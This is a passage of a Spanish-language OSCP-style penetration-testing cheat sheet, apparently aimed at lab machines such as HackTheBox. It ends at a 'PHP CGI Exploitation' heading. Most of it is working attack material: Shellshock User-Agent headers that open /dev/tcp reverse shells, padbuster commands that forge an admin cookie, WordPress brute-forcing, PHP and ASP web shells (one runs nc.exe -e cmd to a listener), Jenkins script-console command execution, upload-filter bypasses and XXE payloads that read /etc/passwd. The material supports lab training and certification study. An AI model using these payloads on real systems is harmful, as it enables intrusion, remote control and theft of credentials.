<span class="s2">&quot;</span><span class="o">)</span><span class="w"> </span>or<span class="w"> </span><span class="o">(</span><span class="s2">&quot;x&quot;</span><span class="o">)=(</span><span class="s2">&quot;x</span>
<span class="s2">&quot;</span><span class="o">))</span><span class="w"> </span>or<span class="w"> </span><span class="o">((</span><span class="s2">&quot;x&quot;</span><span class="o">))=((</span><span class="s2">&quot;x</span>
</code></pre></div>

<h4 id="shellshock">Shellshock<a class="headerlink" href="#shellshock" title="Permanent link">&para;</a></h4>
<p>Buenas máquinas para practicar este tipo de ataques fuera del laboratorio del OSCP son la máquina <strong>Shocker</strong> y la máquina <strong>Beep</strong> de HackTheBox.</p>
<p>Esta es una vulnerabilidad que sólo se ve en Linux, pues en Windows no afecta. La vulnerabilidad lo que nos permite es, tras no validar de forma correcta la declaración de funciones en variables, ejecutar comandos en remoto sobre sistemas a través de consultas en este caso por medio de peticiones web.</p>
<p>Un buen <strong>Low Hanging Fruit</strong> puede consistir en enumerar el directorio <strong>/cgi-bin/</strong> de una página web. De existir, podemos buscar por archivos de extensión '<strong>.cgi</strong>', aunque no es extrictamente necesario... pues también podría tratarse de un archivo de extensión '<strong>.sh</strong>' y los efectos serían los mismos.</p>
<p>En caso de encontrar estos recursos, podemos realizar pruebas como las que se describen a continuación. En primer lugar nos ponemos en escucha por un puerto en nuestro equipo vía Netcat. En segundo lugar realizamos la siguiente petición desde terminal al servicio web:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>curl<span class="w"> </span>--silent<span class="w"> </span>-k<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;User-Agent: () { :; }; /bin/bash -i &gt;&amp; /dev/tcp/ipLocal/puertoLocal 0&gt;&amp;1&quot;</span><span class="w"> </span><span class="s2">&quot;https://192.168.1.X:10000/cgi-bin/recurso.cgi&quot;</span><span class="w"> </span>
</code></pre></div>

<p>Si todo sale bien y es vulnerable a la explotación de dicha vulnerabilidad, deberemos ganar acceso al sistema desde nuestra sesión de escucha.</p>
<p><strong>Advertencia</strong>: En caso de que <strong>/bin/bash</strong> no funcione, se recomienda probar alternativas, pues hay ocasiones en las que la ruta absoluta del binario no es la que hemos especificado, por lo que se requerirá de una ligera enumeración manual o un simple modo alternativo de conexión</p>
<p>Otra opción es desde Burpsuite también, manipulamos el User-Agent para que figure el siguiente contenido:</p>
<div class="codehilite"><pre><span></span><code>User-Agent:<span class="w"> </span><span class="o">()</span><span class="w"> </span><span class="o">{</span><span class="w"> </span>ignored<span class="p">;</span><span class="o">}</span><span class="p">;</span>/bin/bash<span class="w"> </span>-i<span class="w"> </span>&gt;<span class="p">&amp;</span><span class="w"> </span>/dev/tcp/ip/puerto<span class="w"> </span><span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
</code></pre></div>

<h4 id="padding-oracle-attack">Padding Oracle Attack<a class="headerlink" href="#padding-oracle-attack" title="Permanent link">&para;</a></h4>
<p>Esta vulnerabilidad la he llegado a probar en 2 entornos. Uno de ellos es en la máquina <strong>Padding Oracle</strong> de <em>VulnHub</em> y otra de ellas es la máquina <strong>Lazy</strong> de <em>HackTheBox</em>. Ambas máquinas se resuelven de la misma forma en cuanto a explotación de vulnerabilidad respecta, pudiendo tomar 2 vías de explotación.</p>
<p>La <strong>primera vía de explotación</strong> consiste en a través del panel de registro, crear un nuevo usuario donde intuyendo que existe un usuario <strong>admin</strong> definamos un nuevo usuario <strong>admin=</strong>. De esta forma, creando el usuario lo que conseguiremos es crear una instancia de dicho usuario con las mismas propiedades, viendo todo su contenido a posteriori como si se tratara del usuario <strong>admin</strong>. </p>
<p>La <strong>segunda vía de explotación</strong> consiste en crear en primer lugar un nuevo usuario. Una vez creado, llevamos a cabo una autenticación como dicho usuario, pillando la Cookie de sesión desde la pestaña <strong>Network</strong> de la propia inspección de elemento o desde <strong>Burpsuite</strong>.</p>
<p>A continuación, utilizamos la herramienta <strong>padbuster</strong> para llevar a cabo el ataque de oráculo de relleno. Seguimos la siguiente sintaxis:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>padbuster<span class="w"> </span>http://192.168.1.x/login.php<span class="w"> </span>D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km<span class="w"> </span><span class="m">8</span><span class="w"> </span>--cookies<span class="w"> </span><span class="nv">auth</span><span class="o">=</span>D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km<span class="w"> </span>--encoding<span class="w"> </span><span class="m">0</span>
</code></pre></div>

<p>Donde <strong>D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km</strong> es la Cookie de sesión y <strong>8</strong> el número de bloques. A pesar de no saber la cifra con exactitud, podemos montarnos un simple bucle <strong>for i in $(seq 1 100)</strong> a fin de determinar el número de bloques, pues en caso de no ser correcto no se podrá aplicar la inyección.</p>
<p>La herramienta tiene cierta similitud al <strong>sqlmap</strong> para inyecciones SQL, sólo que aquí las inyecciones las aplica sobre ciertas condiciones de error que son mostradas una vez el número de bloques proporcionado es correcto.</p>
<p>Lo que obtendremos una vez todo el proceso se realice correctamente es un Output como el siguiente desde la herramienta:</p>
<div class="codehilite"><pre><span></span><code><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Decrypted<span class="w"> </span>value<span class="w"> </span><span class="o">(</span>ASCII<span class="o">)</span>:<span class="w"> </span><span class="nv">user</span><span class="o">=</span>s4vitar
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Decrypted<span class="w"> </span>value<span class="w"> </span><span class="o">(</span>HEX<span class="o">)</span>:<span class="w"> </span>757365723d733476697461720808080808080808
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Decrypted<span class="w"> </span>value<span class="w"> </span><span class="o">(</span>Base64<span class="o">)</span>:<span class="w"> </span><span class="nv">dXNlcj1zNHZpdGFyCg</span><span class="o">==</span>
</code></pre></div>

<p>Con esto entre manos, lo que podemos hacer es generar desde <strong>Padbuster</strong> la Cookie de sesión válida para el usuario <strong>admin</strong> en base a la autenticación válida del usuario cuya Cookie hemos capturado.</p>
<p>Para ello, desde <strong>Padbuster</strong> aplicamos la siguiente sintaxis:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>padbuster<span class="w"> </span>http://192.168.1.x/login.php<span class="w"> </span>D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km<span class="w"> </span><span class="m">8</span><span class="w"> </span>--cookies<span class="w"> </span><span class="nv">auth</span><span class="o">=</span>D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km<span class="w"> </span>--encoding<span class="w"> </span><span class="m">0</span><span class="w"> </span>--plaintext<span class="w"> </span><span class="nv">user</span><span class="o">=</span>admin
</code></pre></div>

<p>Donde veremos que la herrmamienta directamente nos proporcionará la Cookie de sesión para el usuario administrador.</p>
<p>Lo único que tenemos que hacer ahora, es desde <strong>Burpsuite</strong>, interceptar una autenticación con nuestro usuario para posteriormente modificar la Cookie a la proporcionada por <strong>PadBuster</strong>. Lo que conseguiremos con esto es acceder como el usuario <strong>admin</strong> al servicio web, burlando el panel de autenticación sin ser necesario conocer la contraseña de dicho usuario.</p>
<h4 id="wordpress">WordPress<a class="headerlink" href="#wordpress" title="Permanent link">&para;</a></h4>
<p>Sobre este gestor de contenidos, la idea es verificar en primer lugar si a través del recurso <em>README.html</em> podemos visualizar la versión del CMS. De esta forma, posteriormente desde <strong>Searchsploit</strong> podemos buscar vulnerabilidades para dicha versión.</p>
<p>En caso de no poder visualizar la versión, nos aprovechamos de la herramienta <strong>wpscan</strong> para a través de la siguiente sintaxis obtener el versionado del gestor:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>wpscan<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://192.168.1.x&quot;</span>
</code></pre></div>

<p>En caso de que la web principal del gestor de contenido se encuentre en otra ruta personalizada, por ejemplo <strong>/directorio-wordpress/</strong>, deberemos especificarlo a través del parámetro <strong>--wp-content-dir</strong> para la correcta enumeración desde <strong>wpscan</strong>:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>wpscan<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://192.168.1.x&quot;</span><span class="w"> </span>--wp-content-dir<span class="w"> </span><span class="s2">&quot;directorio-wordpress&quot;</span>
</code></pre></div>

<p>En ocasiones, podremos enumerar los usuarios existentes sobre el gestor, empleando para ello la siguiente sintaxis:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>wpscan<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://192.168.1.x&quot;</span><span class="w"> </span>--enumerate<span class="w"> </span>u
</code></pre></div>

<p>En caso de que el gestor de contenidos cuente con un plugin que bloquee la enumeración de usuarios, podemos hacer uso de la utilidad <strong>stop_user_enumeration_bypass.rb</strong> de <em>wpscan</em> (/usr/share/wpscan/stop_user_enumeration_bypass.rb). La sintaxis sería la siguiente:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>ruby<span class="w"> </span>stop_user_enumeration_bypass.rb<span class="w"> </span>http://192.168.1.x
</code></pre></div>

<p>Tras obtener usuarios válidos de autenticación, podemos probar a realizar a un ataque de fuerza bruta haciendo uso de la siguiente sintaxis:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>wpscan<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://192.168.1.x&quot;</span><span class="w"> </span>--username<span class="w"> </span>usuario<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/rockyou.txt
</code></pre></div>

<p>Una forma de bypassear posibles bloqueos es jugar con el parámetro <strong>--random-agent</strong>, de la siguiente forma:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>wpscan<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://192.168.1.x&quot;</span><span class="w"> </span>--username<span class="w"> </span>usuario<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--random-agent
</code></pre></div>

<p>La herramienta <strong>wpscan</strong> es capaz de detectar los plugins instalados sobre el gestor, los cuales también pueden abrir un posible vector de ataque que permita la ejecución de comandos en remoto y variados. Sin embargo, por prevención siempre me gusta fuzzear los plugins haciendo uso del siguiente <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt">recurso</a> de SecList.</p>
<p>En caso de no obtener o poder enumerar usuarios válidos de autenticación, estos gestores de contenido suelen exponer el usuario propietario de los artículos o entradas que figuren expuestos sobre la página principal. De esta forma, podemos llegar a extraer usuarios válidos de autenticación simplemente visualizando quién es el autor de las entradas publicadas.</p>
<p>Teniendo un usuario válido de autenticación, a la hora de aplicar la fuerza bruta, antes de lanzar diccionarios tradicionales como el <strong>rockyou.txt</strong>, suelo hacer uso de la herramienta <strong>cewl</strong> para generar mi propio diccionario personalizado en base a la web con la que estoy tratando. Esto se consigue con la siguiente sintaxis:</p>
<div class="codehilite"><pre><span></span><code>cewl<span class="w"> </span>-w<span class="w"> </span>diccionario<span class="w"> </span>http://192.168.1.x
</code></pre></div>

<p>Así mismo, una vez se logra acceder al gestor de contenidos, la intrusión al sistema es la parte más sencilla. Simplemente en la sección de Apariencia, en la pestaña Editor nos vamos al script <strong>404.php</strong> configurado para llevar a cabo una modificación, subiendo nuestro propio código PHP malicioso que permita entablarnos una conexión reversa contra el sistema.</p>
<p>Para apuntar a dicho script tenemos 3 vías:</p>
<ul>
<li>http://192.168.1.x/?p=404.php</li>
<li>http://192.168.1.x/recursoinexistente (Para causar un error que haga que se cargue el script 404.php)</li>
<li>http://192.168.1.x/404.php</li>
</ul>
<h4 id="php-reverse-shell-manual-multifuncional">PHP Reverse Shell Manual Multifuncional<a class="headerlink" href="#php-reverse-shell-manual-multifuncional" title="Permanent link">&para;</a></h4>
<p>La más típica de las ejecuciones vía PHP que nos podemos configurar es la siguiente:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="nb">system</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div>

<p>Pero esto dice mucho de nosotros, vamos a mejorar un poco las cosas. En vez de usar <strong>system</strong>, podemos usar <strong>shell_exec</strong>, más específico para la ejecución de comandos vía shell con retorno del output en formato string.</p>
<p>Esto se resume en la siguiente estructura:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div>

<p>En caso de querer ejecutar comandos personalizados desde la URL, podemos definir una estructura como la siguiente:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
<span class="cp">?&gt;</span>
</code></pre></div>

<p>De manera que podríamos elaborar desde la URL la siguiente petición:</p>
<p><code>http://192.168.1.X/fichero.php?cmd=whoami</code></p>
<p>A la hora de ejecutar ciertos comandos como '<em>ps -faux</em>', o un simple '<em>cat /etc/passwd</em>', se puede ver como el Output mostrado vía web en este caso tiene un aspecto poco agradable de leer. Esto lo podemos arreglar añadiendo unas etiquetas de preformateado en nuestro script:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span> <span class="o">.</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div>

<p>En caso de querer hacerlo <strong>multifuncional</strong>, podemos gestionar la variable proporcionada desde el usuario que hace la petición, donde para el caso presentado a continuación, además de ejecutar comandos a través de la variable '<em>fexec</em>', creamos una nueva variable '<em>fupload</em>' para la transferencia de archivos desde nuestra máquina local a la máquina remota en el directorio de trabajo:</p>
<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;fexec&#39;</span><span class="p">])){</span>
        <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;&quot;</span> <span class="o">.</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;fexec&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&lt;/pre&gt;&quot;</span><span class="p">;</span>
    <span class="p">};</span>

    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;fupload&#39;</span><span class="p">])){</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;fupload&#39;</span><span class="p">],</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;http://127.0.0.1:8000/&quot;</span> <span class="o">.</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;fupload&#39;</span><span class="p">]));</span>
    <span class="p">};</span>
<span class="cp">?&gt;</span>
</code></pre></div>

<p>De esta forma, el usuario que hace las consultas podría efectuar cualquiera de las siguientes 3 operaciones:</p>
<ul>
<li>http://192.168.1.X/fichero.php?fexec=whoami</li>
<li>http://192.168.1.X/fichero.php?fupload=script.php </li>
<li>http://192.168.1.X/fichero.php?upload=script.php&amp;fexec=php+script.php</li>
</ul>
<p>Para depositar archivos sobre el sistema aprovechando la variable '<em>fupload</em>', necesitaremos compartir un servidor con Python perviamente sobre el directorio cuyos recursos queramos depositar sobre el equipo remoto.</p>
<h4 id="asp-aspx-reverse-shell">ASP ASPX Reverse Shell<a class="headerlink" href="#asp-aspx-reverse-shell" title="Permanent link">&para;</a></h4>
<p>Habiendo citado ya una forma de entablar una conexión TCP reversa a través de un fichero .asp/.aspx generado desde Metasploit, otra vía en caso de que la primera no funcione, es crear un archivo con dicho contenido:</p>
<div class="codehilite"><pre><span></span><code>&lt;%
Dim<span class="w"> </span>oS
On<span class="w"> </span>Error<span class="w"> </span>Resume<span class="w"> </span>Next
Set<span class="w"> </span><span class="nv">oS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Server.CreateObject<span class="o">(</span><span class="s2">&quot;WSCRIPT.SHELL&quot;</span><span class="o">)</span>
Call<span class="w"> </span>oS.Run<span class="o">(</span><span class="s2">&quot;C:\Inetpub\nc.exe -e cmd 10.11.0.173 1122&quot;</span>,0,True<span class="o">)</span>
%&gt;
</code></pre></div>

<p>Habiendo previamente subido el binario <strong>nc.exe</strong>, con esto conseguiremos que de ser interpretado vía web el script, se nos entable una reverse shell por el puerto 1122 vía Netcat gracias a la ejecución del binario previamente alojado.</p>
<h4 id="x-jenkins">x-jenkins<a class="headerlink" href="#x-jenkins" title="Permanent link">&para;</a></h4>
<p>En caso de que el servicio web corra un <strong>Jenkins</strong>, de manera inmediata se comprobará si existe el recurso <strong>/script/</strong> sobre el servicio. En caso de existir, el servicio es vulnerable a ejecución remota de comandos gracias al script de consultas interactivas que podemos crear desde ahí.</p>
<p>Para ello, deberemos definir las siguientes líneas de consulta:</p>
<div class="codehilite"><pre><span></span><code><span class="nv">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
cmd.execute<span class="o">()</span>.text
</code></pre></div>

<p>Tras enviar la consulta, veremos el Output de la ejecución a nivel de sistema del comando proporcionado.</p>
<h4 id="bypass-file-upload-filtering">Bypass File Upload Filtering<a class="headerlink" href="#bypass-file-upload-filtering" title="Permanent link">&para;</a></h4>
<p>Una de las técnicas típicas además del <strong>Null Byte Injection</strong> y las de <strong>Content-Type</strong>, es la de doble extensión. Esto es simplemente renombrar nuestro script php a <em>shell.php.jpg</em>. </p>
<p>Listo a continuación otros formatos aceptados en función del lenguaje que se utilice:</p>
<p><strong>php</strong> phtml, .php, .php3, .php4, .php5, and .inc
<strong>asp</strong> asp, .aspx
<strong>perl</strong> .pl, .pm, .cgi, .lib
<strong>jsp</strong> .jsp, .jspx, .jsw, .jsv, and .jspf
<strong>Coldfusion</strong> .cfm, .cfml, .cfc, .dbm</p>
<p>En caso de analizar el <strong>Content</strong> en la subida de archivo, podemos bypassearla de la siguiente forma:</p>
<div class="codehilite"><pre><span></span><code>GIF89a<span class="p">;</span>
&lt;?
system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;cmd&#39;</span><span class="o">])</span><span class="p">;</span>
?&gt;
</code></pre></div>

<p>Otra vía alternativa es a través de imágenes, haciendo uso de <strong>exiftool</strong> para insertar metadatos. Para ello, sobre una imagen válida, aplicamos el siguiente comando:</p>
<div class="codehilite"><pre><span></span><code>exiftool<span class="w"> </span>-Comment<span class="o">=</span><span class="s1">&#39;&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&#39;</span>cmd<span class="s1">&#39;]); ?&gt;&#39;</span><span class="w"> </span>imagen.jpg
</code></pre></div>

<p>Posteriormente, es necesario renombar el archivo <strong>imagen.jpg</strong> a <strong>imagen.php.jpg</strong>. Una vez hecho, tras subir la imagen, podremos apuntar a ella jugando con la variable <strong>cmd</strong> posteriormente para ejecutar comandos en remoto sobre el sistema desde la URL.</p>
<p>Otra técnica bastante chula, consiste en subir un archivo <strong>.htaccess</strong>. En caso de existir en el directorio de subida, la idea es poder sobreescribir su contenido. En caso de no existir, es simplemente rezar y esperar que no exista otro en un directorio padre.</p>
<p>Nuestro archivo <strong>.htaccess</strong>, tendría el siguiente contenido:</p>
<div class="codehilite"><pre><span></span><code>Add-Type<span class="w"> </span>Application/x-httpd-php<span class="w"> </span>.miextension
</code></pre></div>

<p>De subirlo y alojarlo en el servidor, posteriormente si subimos un archivo de extensión <strong>.miextension</strong>, será interpretado como un archivo PHP.</p>
<h4 id="xml-external-entity-injection">XML External Entity Injection<a class="headerlink" href="#xml-external-entity-injection" title="Permanent link">&para;</a></h4>
<p>Para practicar podemos jugar con las máquinas <strong>Aragog</strong> y <strong>DevOops</strong> de <strong>HackTheBox</strong>. Antes que nada quiero citar que es necesario conocer la estructura XML que hay por detrás a la hora de interpretar el content, me explico. Supongamos que tras subir un archivo XML, la web nos muestra el siguiente Output:</p>
<div class="codehilite"><pre><span></span><code>User:<span class="w"> </span>s4vitar
Password:<span class="w"> </span>myPassword
</code></pre></div>

<p>Esto ha sido así dado que previamente de alguna forma se nos ha avisado de que las sub-etiquetas a definir en nuestro archivo XML son <strong>User</strong> y <strong>Password</strong>, así como una etiqueta principal <strong>creds</strong> que englobe a estas. Esto nos permite llevar a cabo un ataque como el que describiré a continuación. </p>
<p>En un principio, estaríamos enviando el siguiente archivo XML:</p>
<div class="codehilite"><pre><span></span><code>&lt;?xml<span class="w"> </span><span class="nv">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nv">encoding</span><span class="o">=</span><span class="s2">&quot;ISO-8859-1&quot;</span>?&gt;
<span class="w">    </span>&lt;creds&gt;
<span class="w">       </span>&lt;User&gt;s4vitar&lt;/user&gt;
<span class="w">       </span>&lt;Pass&gt;myPassword&lt;/pass&gt;
<span class="w">    </span>&lt;/creds&gt;
</code></pre></div>

<p>Conociendo por tanto la estructura, podríamos decidir enviar un contenido como el siguiente:</p>
<div class="codehilite"><pre><span></span><code>&lt;?xml<span class="w"> </span><span class="nv">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nv">encoding</span><span class="o">=</span><span class="s2">&quot;ISO-8859-1&quot;</span>?&gt;
<span class="w"> </span>&lt;!DOCTYPE<span class="w"> </span>foo<span class="w"> </span><span class="o">[</span><span class="w"> </span>&lt;!ELEMENT<span class="w"> </span>foo<span class="w"> </span>ANY<span class="w"> </span>&gt;
<span class="w">   </span>&lt;!ENTITY<span class="w"> </span>xxe<span class="w"> </span>SYSTEM<span class="w"> </span><span class="s2">&quot;expect://id&quot;</span><span class="w"> </span>&gt;<span class="o">]</span>&gt;
<span class="w">    </span>&lt;creds&gt;
<span class="w">       </span>&lt;User&gt;<span class="p">&amp;</span>xxe<span class="p">;</span>&lt;/user&gt;
<span class="w">       </span>&lt;Pass&gt;myPassword&lt;/pass&gt;
<span class="w">    </span>&lt;/creds&gt;
</code></pre></div>

<p>A la hora de listar el Output desde la web, nos encontraríamos con el siguiente resultado:</p>
<div class="codehilite"><pre><span></span><code>User:<span class="w"> </span>www-data
Password:<span class="w"> </span>myPassword
</code></pre></div>

<p>Esto ha sido así dado que estamos jugando con el <em>wrapper</em> <strong>expect</strong>. Hay casos en los que puede que no se logre ejecutar comandos en el sistema, en tal caso podríamos probar a leer archivos de la siguiente forma:</p>
<div class="codehilite"><pre><span></span><code>&lt;?xml<span class="w"> </span><span class="nv">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nv">encoding</span><span class="o">=</span><span class="s2">&quot;ISO-8859-1&quot;</span>?&gt;
<span class="w"> </span>&lt;!DOCTYPE<span class="w"> </span>foo<span class="w"> </span><span class="o">[</span><span class="w"> </span>&lt;!ELEMENT<span class="w"> </span>foo<span class="w"> </span>ANY<span class="w"> </span>&gt;
<span class="w">   </span>&lt;!ENTITY<span class="w"> </span>xxe<span class="w"> </span>SYSTEM<span class="w"> </span><span class="s2">&quot;file:///etc/passwd&quot;</span><span class="w"> </span>&gt;<span class="o">]</span>&gt;
<span class="w">    </span>&lt;creds&gt;
<span class="w">       </span>&lt;User&gt;<span class="p">&amp;</span>xxe<span class="p">;</span>&lt;/user&gt;
<span class="w">       </span>&lt;Pass&gt;myPassword&lt;/pass&gt;
<span class="w">    </span>&lt;/creds&gt;
</code></pre></div>

<p>Donde tal y como se podrá predecir, en el campo <strong>User</strong> se listará el contenido del fichero <strong>/etc/passwd</strong>. Una idea aquí es visualizar si para algunas de los usuarios existentes en base a la visualización del recurso anteriormente visto, bajo el directorio <strong>.ssh</strong> podemos encontrarnos con una clave privada de acceso por SSH para usarla como fichero de identificación, de esta forma... lograríamos acceder al sistema sin proporcionar contraseña alguna.</p>
<p>Otro ejemplo práctico así como modo de hacer el mismo procedimiento es el siguiente. Supongamos un servicio Apache, esta vez no tenemos la posibilidad de subir archivos, sin embargo contamos por detrás con la siguiente estructura:</p>
<div class="codehilite"><pre><span></span><code>&lt;?php<span class="w"> </span>
<span class="w">    </span>libxml_disable_entity_loader<span class="w"> </span><span class="o">(</span><span class="nb">false</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>
<span class="w">    </span><span class="nv">$xmlfile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>file_get_contents<span class="o">(</span><span class="s1">&#39;php://input&#39;</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>
<span class="w">    </span><span class="nv">$dom</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>new<span class="w"> </span>DOMDocument<span class="o">()</span><span class="p">;</span><span class="w"> </span>
<span class="w">    </span><span class="nv">$dom</span>-&gt;loadXML<span class="o">(</span><span class="nv">$xmlfile</span>,<span class="w"> </span>LIBXML_NOENT<span class="w"> </span><span class="p">|</span><span class="w"> </span>LIBXML_DTDLOAD<span class="o">)</span><span class="p">;</span><span class="w"> </span>
<span class="w">    </span><span class="nv">$creds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>simplexml_import_dom<span class="o">(</span><span class="nv">$dom</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>
<span class="w">    </span><span class="nv">$user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$creds</span>-&gt;user<span class="p">;</span><span class="w"> </span>
<span class="w">    </span><span class="nv">$pass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$creds</span>-&gt;pass<span class="p">;</span><span class="w"> </span>
<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;You have logged in as user </span><span class="nv">$user</span><span class="s2">&quot;</span><span class="p">;</span>
?&gt;<span class="w"> </span>
</code></pre></div>

<p>Como es de obviar, se nos pide una estructura XML como la siguiente:</p>
<div class="codehilite"><pre><span></span><code>&lt;creds&gt;
<span class="w">    </span>&lt;user&gt;Ed&lt;/user&gt;
<span class="w">    </span>&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;
</code></pre></div>

<p>En este caso varía un poco la petición, pero podemos hacerla desde terminal:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>curl<span class="w"> </span>-d<span class="w"> </span>@xml.txt<span class="w"> </span>http://localhost/xml_injectable.php<span class="w"> </span>
</code></pre></div>

<p>El concepto al fin y al cabo es el mismo, el servidor responde lo siguiente:</p>
<div class="codehilite"><pre><span></span><code>You<span class="w"> </span>have<span class="w"> </span>logged<span class="w"> </span><span class="k">in</span><span class="w"> </span>as<span class="w"> </span>user<span class="w"> </span>Ed
</code></pre></div>

<p>Y a raíz de esto, podemos elaborar una estructura XML maliciosa como la siguiente:</p>
<div class="codehilite"><pre><span></span><code>&lt;?xml<span class="w"> </span><span class="nv">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nv">encoding</span><span class="o">=</span><span class="s2">&quot;ISO-8859-1&quot;</span>?&gt;
&lt;!DOCTYPE<span class="w"> </span>foo<span class="w"> </span><span class="o">[</span><span class="w"> </span>&lt;!ELEMENT<span class="w"> </span>foo<span class="w"> </span>ANY<span class="w"> </span>&gt;
&lt;!ENTITY<span class="w"> </span>xxe<span class="w"> </span>SYSTEM<span class="w"> </span><span class="s2">&quot;file:///etc/passwd&quot;</span><span class="w"> </span>&gt;<span class="o">]</span>&gt;
&lt;creds&gt;
<span class="w">    </span>&lt;user&gt;<span class="p">&amp;</span>xxe<span class="p">;</span>&lt;/user&gt;
<span class="w">    </span>&lt;pass&gt;mypass&lt;/pass&gt;
&lt;/creds&gt;
</code></pre></div>

<p>¿Qué conseguimos con esto?, obtener lo siguiente:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span>curl<span class="w"> </span>-d<span class="w"> </span>@xml.txt<span class="w"> </span>http://localhost/xml_injectable.php<span class="w"> </span>

You<span class="w"> </span>have<span class="w"> </span>logged<span class="w"> </span><span class="k">in</span><span class="w"> </span>as<span class="w"> </span>user<span class="w"> </span>root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</code></pre></div>

<h4 id="php-cgi-exploitation">PHP CGI Exploitation<a class="headerlink" href="#php-cgi-exploitation" title="Permanent link">&para;</a></h4>
